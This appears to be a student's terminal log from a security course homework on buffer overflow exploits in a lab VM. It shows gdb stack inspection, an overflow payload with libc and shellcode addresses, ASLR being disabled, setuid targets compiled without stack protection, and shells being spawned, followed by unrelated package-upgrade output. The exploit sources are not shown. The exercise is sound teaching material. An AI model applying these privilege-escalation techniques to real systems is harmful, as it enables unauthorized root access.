 Arglist at 0xbffffdcc, args: 
    temp=0xbfffff73 "AAAAAAAAp&\345\267\360H\377\267\242\377\377\277\200\232\353\267\320y㷱\377\377\277\261\377\377\277\354\375\377\277"
 Locals at 0xbffffdcc, Previous frame's sp is 0xbffffdd4
 Saved registers:
  ebp at 0xbffffdcc, eip at 0xbffffdd0
(gdb) x/64x 0xbffffdcc-128
0xbffffd4c:	0xb7e996bb	0xbffffd7e	0xbffffe80	0x000000e0
0xbffffd5c:	0x00000000	0xb7fff000	0xb7fff918	0xbffffd80
0xbffffd6c:	0x08048284	0x00000000	0xbffffe14	0xb7fbb000
0xbffffd7c:	0x0000ff17	0xffffffff	0x0000002f	0xb7e15dc8
0xbffffd8c:	0xb7fd51b0	0x00008000	0xb7fbb000	0xb7fb9244
0xbffffd9c:	0xb7e210ec	0x00000002	0x00000000	0xb7e37a50
0xbffffdac:	0x0804854b	0x00000002	0xbffffe74	0xbffffe80
0xbffffdbc:	0x08048521	0xb7fbb3dc	0x08048220	0x08048509
0xbffffdcc:	0xbffffdd8	0x080484e8	0xbfffff73	0x00000000
0xbffffddc:	0xb7e21637	0x00000002	0xbffffe74	0xbffffe80
0xbffffdec:	0x00000000	0x00000000	0x00000000	0xb7fbb000
0xbffffdfc:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fbb000
0xbffffe0c:	0xb7fbb000	0x00000000	0x8fe8dc05	0xb438f215
0xbffffe1c:	0x00000000	0x00000000	0x00000000	0x00000002
0xbffffe2c:	0x080483a0	0x00000000	0xb7ff0010	0xb7fea880
0xbffffe3c:	0xb7fff000	0x00000002	0x080483a0	0x00000000
(gdb) n
11	}
(gdb) x/64x 0xbffffdcc-128
0xbffffd4c:	0xb7fd54a0	0x00000001	0x00000001	0x00000000
0xbffffd5c:	0x00000000	0xb7e7df95	0xb7fe996a	0xbffffd80
0xbffffd6c:	0x08048284	0xb7fff000	0x08048250	0xb7fbb000
0xbffffd7c:	0x0000ff17	0xffffffff	0xb7e0d598	0xb7e15dc8
0xbffffd8c:	0xb7fd51b0	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffd9c:	0xb7fbb000	0xbffffdcc	0xb7ff0010	0xbffffe04
0xbffffdac:	0xb7e8fe10	0xbffffdc8	0x00000000	0xb7fbb000
0xbffffdbc:	0x080484ad	0xbffffdc8	0xbfffff73	0x41414141
0xbffffdcc:	0x41414141	0xb7e52670	0xb7ff48f0	0xbfffffa2
0xbffffddc:	0xb7eb9a80	0xb7e379d0	0xbfffffb1	0xbfffffb1
0xbffffdec:	0xbffffdec	0x00000000	0x00000000	0xb7fbb000
0xbffffdfc:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fbb000
0xbffffe0c:	0xb7fbb000	0x00000000	0x8fe8dc05	0xb438f215
0xbffffe1c:	0x00000000	0x00000000	0x00000000	0x00000002
0xbffffe2c:	0x080483a0	0x00000000	0xb7ff0010	0xb7fea880
0xbffffe3c:	0xb7fff000	0x00000002	0x080483a0	0x00000000
(gdb) p printf
$1 = {<text variable, no debug info>} 0xb7e52670 <__printf>
(gdb) p/x getenv("thing")
$2 = 0xbfffffa2
(gdb) p excl
No symbol "excl" in current context.
(gdb) p execl
$3 = {<text variable, no debug info>} 0xb7eb9a80 <__GI_execl>
(gdb) p/x getenv("shellcode")
$4 = 0xbfffffb1
(gdb) disas /m foo
Dump of assembler code for function foo:
7	{
   0x0804849b <+0>:	push   %ebp
   0x0804849c <+1>:	mov    %esp,%ebp
   0x0804849e <+3>:	sub    $0x4,%esp

8	  char name[4];
9	
10	  strcpy(name, temp);
   0x080484a1 <+6>:	pushl  0x8(%ebp)
   0x080484a4 <+9>:	lea    -0x4(%ebp),%eax
   0x080484a7 <+12>:	push   %eax
   0x080484a8 <+13>:	call   0x8048360 <strcpy@plt>
   0x080484ad <+18>:	add    $0x8,%esp

11	}
=> 0x080484b0 <+21>:	nop
   0x080484b1 <+22>:	leave  
   0x080484b2 <+23>:	ret    

End of assembler dump.
(gdb) q
A debugging session is active.

	Inferior 1 [process 1987] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ rm /bin/sh
rm: cannot remove '/bin/sh': Permission denied
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo rm /bin/sh
[sudo] password for student: 
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo ln -s /bin/dash /bin/sh
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit1
Reading symbols from sploit1...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit1.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit1 

Breakpoint 1, main () at sploit1.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 2121 is executing new program: /tmp/target1

Breakpoint 1, main (argc=2, argv=0xbffffe94) at target1.c:16
16	  if( argc != 2 )
(gdb) disas /m greeting
No symbol "greeting" in current context.
(gdb) disas /m foo
Dump of assembler code for function foo:
7	{
   0x0804849b <+0>:	push   %ebp
   0x0804849c <+1>:	mov    %esp,%ebp
   0x0804849e <+3>:	sub    $0x4,%esp

8	  char name[4];
9	
10	  strncpy(name, temp, 12);
   0x080484a1 <+6>:	push   $0xc
   0x080484a3 <+8>:	pushl  0x8(%ebp)
   0x080484a6 <+11>:	lea    -0x4(%ebp),%eax
   0x080484a9 <+14>:	push   %eax
   0x080484aa <+15>:	call   0x8048380 <strncpy@plt>
   0x080484af <+20>:	add    $0xc,%esp

11	}
   0x080484b2 <+23>:	nop
   0x080484b3 <+24>:	leave  
   0x080484b4 <+25>:	ret    

End of assembler dump.
(gdb) q
A debugging session is active.

	Inferior 1 [process 2121] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484fd: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 2132 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffe74) at target4.c:16
16	  if( argc != 2 )
(gdb) disas /m main
Dump of assembler code for function main:
15	{
   0x080484b3 <+0>:	push   %ebp
   0x080484b4 <+1>:	mov    %esp,%ebp

16	  if( argc != 2 )
=> 0x080484b6 <+3>:	cmpl   $0x2,0x8(%ebp)
   0x080484ba <+7>:	je     0x80484da <main+39>

17	  {
18	    fprintf(stderr, "meet: argc != 2\n");
   0x080484bc <+9>:	mov    0x804a028,%eax
   0x080484c1 <+14>:	push   %eax
   0x080484c2 <+15>:	push   $0x10
   0x080484c4 <+17>:	push   $0x1
   0x080484c6 <+19>:	push   $0x8048580
   0x080484cb <+24>:	call   0x8048350 <fwrite@plt>
   0x080484d0 <+29>:	add    $0x10,%esp

19	    exit(EXIT_FAILURE);
   0x080484d3 <+32>:	push   $0x1
   0x080484d5 <+34>:	call   0x8048370 <exit@plt>

20	  }
21	
22	  foo( argv[1] );
   0x080484da <+39>:	mov    0xc(%ebp),%eax
   0x080484dd <+42>:	add    $0x4,%eax
   0x080484e0 <+45>:	mov    (%eax),%eax
   0x080484e2 <+47>:	push   %eax
   0x080484e3 <+48>:	call   0x804849b <foo>
   0x080484e8 <+53>:	add    $0x4,%esp

23	  return 0;
   0x080484eb <+56>:	mov    $0x0,%eax

24	}
   0x080484f0 <+61>:	leave  
   0x080484f1 <+62>:	ret    

End of assembler dump.
(gdb) q
A debugging session is active.

	Inferior 1 [process 2132] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ which dash
/bin/dash
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /bin/dash -p
$ whoami
student
$ exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ Connection to localhost closed by remote host.
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-70-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
0 updates are security updates.

New release '18.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Mon Dec  2 12:03:54 2019 from 10.0.2.2
student@5435-hw4-vm:~$ 
student@5435-hw4-vm:~$ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for student: 
kernel.randomize_va_space = 0
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
target0   target1    target2    target3    target4
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ lls
No command 'lls' found, did you mean:
 Command 'ils' from package 'sleuthkit' (universe)
 Command 'lvs' from package 'lvm2' (main)
 Command 'fls' from package 'sleuthkit' (universe)
 Command 'les' from package 'atm-tools' (universe)
 Command 'llt' from package 'storebackup' (universe)
 Command 'hls' from package 'hfsutils' (main)
 Command 'lli' from package 'llvm-runtime' (universe)
 Command 'bls' from package 'bareos-tools' (universe)
 Command 'bls' from package 'bacula-sd' (universe)
 Command 'ols' from package 'speech-tools' (universe)
 Command 'llc' from package 'llvm' (universe)
 Command 'als' from package 'atool' (universe)
 Command 'jls' from package 'sleuthkit' (universe)
 Command 'ls' from package 'coreutils' (main)
 Command 'lrs' from package 'lrslib' (universe)
lls: command not found
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
sploit0      sploit1    sploit2    sploit3    sploit4    sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) c
Continuing.
process 1282 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe84) at target3.c:20
20	  if( argc != 2 )
(gdb) c
Continuing.
process 1282 is executing new program: /bin/dash

Breakpoint 1, 0x0040f4a0 in main ()
(gdb) c
Continuing.
$ whoami
student
$ exit
[Inferior 1 (process 1282) exited normally]
(gdb) ls /bin/sh
Undefined command: "ls".  Try "help".
(gdb) e
Ambiguous command "e": echo, edit, en, enable, end, eval, exec-file, explore, expression.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls /bin/sh
/bin/sh
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la /bin/sh
lrwxrwxrwx 1 root root 9 Dec  2 13:32 /bin/sh -> /bin/dash
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo apt-get install sh
Reading package lists... Done
Building dependency tree       
Reading state information... Done
E: Unable to locate package sh
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ which zsh
/usr/bin/zsh
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) p setuid
$1 = {<text variable, no debug info>} 0xb7eba2e0 <__setuid>
(gdb) q
A debugging session is active.

	Inferior 1 [process 1296] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -o sploitEC sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484fd: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) c
Continuing.
process 1951 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffe94) at target4.c:16
16	  if( argc != 2 )
(gdb) p/x getenv("shellcode")
$1 = 0xbfffffbd
(gdb) p/x getenv("thing")
$2 = 0xbfffffb2
(gdb) q
A debugging session is active.

	Inferior 1 [process 1951] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -o sploitEC sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
/bin/sh: 0: Can't open 
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /bin/sh
$ whoami
student
$ exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ apt-get install metasploit-framework
E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root?
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo apt-get install metasploit-framework
[sudo] password for student: 
Reading package lists... Done
Building dependency tree       
Reading state information... Done
E: Unable to locate package metasploit-framework
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo add-apt-repository -y ppa:webupd8team/java
gpg: keyring `/tmp/tmpsa5nt9kq/secring.gpg' created
gpg: keyring `/tmp/tmpsa5nt9kq/pubring.gpg' created
gpg: requesting key EEA14886 from hkp server keyserver.ubuntu.com
gpg: /tmp/tmpsa5nt9kq/trustdb.gpg: trustdb created
gpg: key EEA14886: public key "Launchpad VLC" imported
gpg: no ultimately trusted keys found
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)
OK
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo apt-get update
Hit:1 http://us.archive.ubuntu.com/ubuntu xenial InRelease
Get:2 http://us.archive.ubuntu.com/ubuntu xenial-updates InRelease [109 kB]                   
Get:3 http://us.archive.ubuntu.com/ubuntu xenial-backports InRelease [107 kB]                           
Get:4 http://ppa.launchpad.net/webupd8team/java/ubuntu xenial InRelease [17.6 kB]                        
Get:5 http://security.ubuntu.com/ubuntu xenial-security InRelease [109 kB]          
Get:6 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 Packages [887 kB]
Get:7 http://us.archive.ubuntu.com/ubuntu xenial-updates/main Translation-en [416 kB]
Get:8 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 DEP-11 Metadata [322 kB]
Get:9 http://us.archive.ubuntu.com/ubuntu xenial-updates/main DEP-11 64x64 Icons [238 kB]
Get:10 http://us.archive.ubuntu.com/ubuntu xenial-updates/universe i386 Packages [700 kB]
Get:11 http://security.ubuntu.com/ubuntu xenial-security/main i386 Packages [618 kB]
Get:12 http://us.archive.ubuntu.com/ubuntu xenial-updates/universe Translation-en [324 kB]
Get:13 http://security.ubuntu.com/ubuntu xenial-security/main i386 DEP-11 Metadata [74.8 kB]
Get:14 http://us.archive.ubuntu.com/ubuntu xenial-updates/universe i386 DEP-11 Metadata [276 kB]
Get:15 http://security.ubuntu.com/ubuntu xenial-security/main DEP-11 64x64 Icons [83.8 kB]
Get:16 http://us.archive.ubuntu.com/ubuntu xenial-updates/universe DEP-11 64x64 Icons [405 kB]
Get:17 http://us.archive.ubuntu.com/ubuntu xenial-updates/multiverse i386 DEP-11 Metadata [7,140 B]
Get:18 http://us.archive.ubuntu.com/ubuntu xenial-updates/multiverse DEP-11 64x64 Icons [14.3 kB]
Get:19 http://us.archive.ubuntu.com/ubuntu xenial-backports/main i386 DEP-11 Metadata [3,328 B]
Get:20 http://us.archive.ubuntu.com/ubuntu xenial-backports/universe i386 DEP-11 Metadata [5,324 B]
Get:21 http://security.ubuntu.com/ubuntu xenial-security/universe i386 Packages [401 kB]
Get:22 http://security.ubuntu.com/ubuntu xenial-security/universe i386 DEP-11 Metadata [124 kB]
Get:23 http://security.ubuntu.com/ubuntu xenial-security/universe DEP-11 64x64 Icons [194 kB]
Get:24 http://security.ubuntu.com/ubuntu xenial-security/multiverse i386 DEP-11 Metadata [2,464 B]
Fetched 5,438 kB in 2s (2,195 kB/s)     
Reading package lists... Done
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo apt-get -y install oracle-java8-installer
Reading package lists... Done
Building dependency tree... 50%
Building dependency tree       
Reading state information... Done
Package oracle-java8-installer is not available, but is referred to by another package.
This may mean that the package is missing, has been obsoleted, or
is only available from another source

E: Package 'oracle-java8-installer' has no installation candidate
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ 
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo apt-get update
Hit:1 http://security.ubuntu.com/ubuntu xenial-security InRelease
Hit:2 http://us.archive.ubuntu.com/ubuntu xenial InRelease
Hit:3 http://us.archive.ubuntu.com/ubuntu xenial-updates InRelease      
Hit:4 http://us.archive.ubuntu.com/ubuntu xenial-backports InRelease    
Hit:5 http://ppa.launchpad.net/webupd8team/java/ubuntu xenial InRelease 
Reading package lists... Done                     
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo apt-get upgrade
Reading package lists... Done
Building dependency tree       
Reading state information... Done
Calculating upgrade... Done
The following package was automatically installed and is no longer required:
  snapd-login-service
Use 'sudo apt autoremove' to remove it.
The following packages have been kept back:
  linux-generic-hwe-16.04 linux-headers-generic-hwe-16.04 linux-image-generic-hwe-16.04 ubuntu-desktop
The following packages will be upgraded:
  apt apt-transport-https apt-utils aptdaemon aptdaemon-data base-files bind9-host bsdutils console-setup
  console-setup-linux debconf debconf-i18n dnsutils dpkg dpkg-dev friendly-recovery fwupd gnome-software
  gnome-software-common grub-common grub-pc grub-pc-bin grub2-common initramfs-tools initramfs-tools-bin
  initramfs-tools-core iproute2 keyboard-configuration libapt-inst2.0 libapt-pkg5.0 libbind9-140 libblkid1
  libdfu1 libdns-export162 libdns162 libdpkg-perl libfdisk1 libfwupd1 libisc-export160 libisc160
  libisccc140 libisccfg140 libldap-2.4-2 liblwres141 libmount1 libpam-systemd libsmartcols1 libsnapd-glib1
  libsnmp-base libsnmp30 libsqlite3-0 libsystemd0 libudev1 libunity-core-6.0-9 libuuid1 linux-libc-dev
  login lshw mount passwd psmisc python-apt-common python3-apt python3-aptdaemon
  python3-aptdaemon.gtk3widgets python3-aptdaemon.pkcompat python3-distupgrade python3-software-properties
  python3-update-manager resolvconf rsyslog snapd software-properties-common software-properties-gtk
  systemd systemd-sysv ubuntu-core-launcher ubuntu-minimal ubuntu-release-upgrader-core
  ubuntu-release-upgrader-gtk ubuntu-software ubuntu-standard udev unattended-upgrades unity unity-schemas
  unity-services update-manager update-manager-core ureadahead usb-creator-common usb-creator-gtk
  util-linux uuid-runtime
94 upgraded, 0 newly installed, 0 to remove and 4 not upgraded.
Need to get 41.9 MB of archives.
After this operation, 10.9 MB disk space will be freed.
Do you want to continue? [Y/n] Y
Get:1 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 base-files i386 9.4ubuntu4.11 [67.5 kB]
Get:2 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 bsdutils i386 1:2.27.1-6ubuntu3.9 [52.9 kB]
Get:3 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 dpkg i386 1.18.4ubuntu1.6 [2,113 kB]
Get:4 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 login i386 1:4.2-3.1ubuntu5.4 [307 kB]
Get:5 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 util-linux i386 2.27.1-6ubuntu3.9 [874 kB]
Get:6 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 mount i386 2.27.1-6ubuntu3.9 [127 kB]
Get:7 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 passwd i386 1:4.2-3.1ubuntu5.4 [787 kB]
Get:8 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libuuid1 i386 2.27.1-6ubuntu3.9 [15.6 kB]
Get:9 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libblkid1 i386 2.27.1-6ubuntu3.9 [120 kB]
Get:10 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libsystemd0 i386 229-4ubuntu21.22 [222 kB]
Get:11 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libpam-systemd i386 229-4ubuntu21.22 [122 kB]
Get:12 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 systemd i386 229-4ubuntu21.22 [3,663 kB]
Get:13 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 udev i386 229-4ubuntu21.22 [999 kB]
Get:14 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libudev1 i386 229-4ubuntu21.22 [57.1 kB]
Get:15 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 grub-pc i386 2.02~beta2-36ubuntu3.23 [197 kB]
Get:16 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 grub-pc-bin i386 2.02~beta2-36ubuntu3.23 [917 kB]
Get:17 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 grub2-common i386 2.02~beta2-36ubuntu3.23 [545 kB]
Get:18 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 grub-common i386 2.02~beta2-36ubuntu3.23 [1,740 kB]
Get:19 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 friendly-recovery all 0.2.31ubuntu2.1 [9,732 B]
Get:20 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 initramfs-tools all 0.122ubuntu8.16 [8,928 B]
Get:21 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 initramfs-tools-core all 0.122ubuntu8.16 [45.0 kB]
Get:22 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 initramfs-tools-bin i386 0.122ubuntu8.16 [9,458 B]
Get:23 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 debconf-i18n all 1.5.58ubuntu2 [206 kB]
Get:24 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 debconf all 1.5.58ubuntu2 [136 kB]     
Get:25 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 systemd-sysv i386 229-4ubuntu21.22 [11.5 kB]
Get:26 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libmount1 i386 2.27.1-6ubuntu3.9 [125 kB]
Get:27 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libapt-pkg5.0 i386 1.2.32 [753 kB]     
Get:28 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libapt-inst2.0 i386 1.2.32 [57.4 kB]   
Get:29 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 apt i386 1.2.32 [1,105 kB]             
Get:30 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 apt-utils i386 1.2.32 [205 kB]         
Get:31 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 uuid-runtime i386 2.27.1-6ubuntu3.9 [26.3 kB]
Get:32 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 ubuntu-core-launcher i386 2.40 [1,562 B]
Get:33 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 snapd i386 2.40 [10.8 MB]              
Get:34 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libfdisk1 i386 2.27.1-6ubuntu3.9 [154 kB]
Get:35 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libsmartcols1 i386 2.27.1-6ubuntu3.9 [67.5 kB]
Get:36 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libsqlite3-0 i386 3.11.0-1ubuntu1.3 [422 kB]
Get:37 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 console-setup-linux all 1.108ubuntu15.5 [984 kB]
Get:38 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 console-setup all 1.108ubuntu15.5 [117 kB]
Get:39 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 keyboard-configuration all 1.108ubuntu15.5 [658 kB]
Get:40 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 iproute2 i386 4.3.0-1ubuntu3.16.04.5 [547 kB]
Get:41 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libisc-export160 i386 1:9.10.3.dfsg.P4-8ubuntu1.15 [163 kB]
Get:42 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libdns-export162 i386 1:9.10.3.dfsg.P4-8ubuntu1.15 [722 kB]
Get:43 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 resolvconf all 1.78ubuntu7 [52.7 kB]   
Get:44 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 rsyslog i386 8.16.0-1ubuntu3.1 [399 kB]
Get:45 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 ureadahead i386 0.100.0-19.1 [20.4 kB] 
Get:46 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 ubuntu-minimal i386 1.361.4 [2,774 B]  
Get:47 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 apt-transport-https i386 1.2.32 [28.5 kB]
Get:48 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 dnsutils i386 1:9.10.3.dfsg.P4-8ubuntu1.15 [94.3 kB]
Get:49 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 bind9-host i386 1:9.10.3.dfsg.P4-8ubuntu1.15 [41.8 kB]
Get:50 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libisc160 i386 1:9.10.3.dfsg.P4-8ubuntu1.15 [229 kB]
Get:51 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libdns162 i386 1:9.10.3.dfsg.P4-8ubuntu1.15 [941 kB]
Get:52 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libisccc140 i386 1:9.10.3.dfsg.P4-8ubuntu1.15 [17.5 kB]
Get:53 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libisccfg140 i386 1:9.10.3.dfsg.P4-8ubuntu1.15 [40.6 kB]
Get:54 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 liblwres141 i386 1:9.10.3.dfsg.P4-8ubuntu1.15 [36.5 kB]
Get:55 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libbind9-140 i386 1:9.10.3.dfsg.P4-8ubuntu1.15 [25.8 kB]
Get:56 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libldap-2.4-2 i386 2.4.42+dfsg-2ubuntu3.7 [172 kB]
Get:57 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 lshw i386 02.17-1.1ubuntu3.6 [242 kB]  
Get:58 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 psmisc i386 22.21-2.1ubuntu0.1 [48.7 kB]
Get:59 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 python-apt-common all 1.1.0~beta1ubuntu0.16.04.5 [16.2 kB]
Get:60 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 python3-apt i386 1.1.0~beta1ubuntu0.16.04.5 [141 kB]
Get:61 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 ubuntu-release-upgrader-gtk all 1:16.04.29 [9,336 B]
